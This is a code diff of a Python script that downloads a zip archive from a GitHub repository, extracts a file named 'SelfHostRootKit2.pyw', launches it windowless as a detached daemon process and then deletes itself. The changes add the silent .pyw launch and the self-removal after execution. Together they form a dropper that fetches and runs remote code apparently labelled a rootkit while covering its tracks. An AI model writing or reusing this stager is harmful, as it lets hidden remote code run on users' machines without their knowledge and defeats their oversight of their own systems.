@@ -1,4 +1,5 @@
 import time, subprocess, os, shutil, zipfile
+from multiprocessing import Process
 tryit = False
 while tryit == False:
     try:
@@ -102,7 +103,7 @@ while tryit == False:
 tryit = False
 while tryit == False:
     try:
-        url, listfile = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", "SelfHostRootKit2.py"
+        url, listfile = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip", "SelfHostRootKit2.pyw"
         dir = getNameDir(url)
         downloadFileGithub(url)
         moveFileFromDir(dir, listfile)
@@ -113,5 +114,14 @@ while tryit == False:
     except:
         print("download error")
         time.sleep(0.5)
-os.remove(getFileName())
-os.system("SelfHostRootKit2.py")
+
+def open():
+    subprocess.Popen("SelfHostRootKit2.pyw", shell=True)
+
+if __name__ == "__main__":
+    p = Process(target=open)
+    p.daemon = True
+    p.start()
+    time.sleep(4)
+    os.remove(getFileName())
+    exit()
